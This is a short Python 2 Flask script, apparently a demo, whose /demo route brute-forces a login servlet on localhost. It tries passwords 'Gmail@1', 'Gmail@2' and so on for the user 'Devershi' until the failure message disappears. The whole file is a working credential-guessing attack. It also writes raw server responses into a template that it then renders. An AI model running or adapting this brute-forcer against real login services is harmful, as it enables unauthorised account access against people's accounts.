from flask import Flask, request, render_template
import requests

app = Flask(__name__)

@app.route('/demo', methods=['GET','POST'])
def bruteForce():
	url = "http://localhost:8080/session/LoginServlet"
	br = {}
	br["name"] = "Devershi"
	i = 1
	while True:
		br["password"] = str("Gmail@")+str(i)
		print 'Now trying password ' + br["password"]
		r = requests.post(url, br)
		response_file = "./templates/results.html"
		with open(response_file, "w") as f:
			f.write(r.content)
		data = ""
		with open(response_file, 'r') as myfile:
			data = myfile.read().replace('\n', ' ')
		if "Sorry, username or password" in  data:
			print 'Failed for password ' + br["password"]
			i+=1
			data = ""
		else:
			break
		# print 'howdy'
	return render_template('results.html')
if __name__ == '__main__':
	app.run()